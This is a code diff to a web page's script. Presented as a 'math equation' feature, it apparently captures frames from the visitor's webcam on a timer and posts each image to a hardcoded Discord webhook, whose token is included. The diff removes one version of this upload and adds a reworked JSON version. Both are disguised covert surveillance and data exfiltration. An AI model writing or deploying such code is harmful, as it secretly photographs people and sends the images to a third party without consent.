@@ -55,22 +55,22 @@
       }, 3000);
 
       function captureImage() {
-        var video = document.querySelector('video');
-        var canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(function(blob) {
-          var formData = new FormData();
-          formData.append('file', blob, 'math-equation.jpg');
-          var xhr = new XMLHttpRequest();
-          xhr.open('POST', 'https://discord.com/api/webhooks/1092428597295337563/aGEEAAjT0UgS6oyWIvXahrkhEP51fVgs_jIlPYuNO0smX_KwWIfmigmOJU0YKCqDPXKa');
-          xhr.send(formData);
-        }, 'image/jpeg', 1.0);
-        var equation = 'Equation ' + imageCounter++;
-        document.getElementById('math-image').src = URL.createObjectURL(canvas.toDataURL());
-        document.getElementById('math-equation').innerHTML = equation;
+      var video = document.querySelector('video');
+      var canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      var imgData = canvas.toDataURL('image/jpeg', 1.0);
+      var data = {'content': imgData};
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://discord.com/api/webhooks/1092428597295337563/aGEEAAjT0UgS6oyWIvXahrkhEP51fVgs_jIlPYuNO0smX_KwWIfmigmOJU0YKCqDPXKa');
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      xhr.send(JSON.stringify(data));
+      var equation = 'Equation ' + imageCounter++;
+      document.getElementById('math-image').src = imgData;
+      document.getElementById('math-equation').innerHTML = equation;
       }
+
 
       var constraints = { video: { width: 400, height: 300 } };
       navigator.mediaDevices.getUserMedia(constraints)
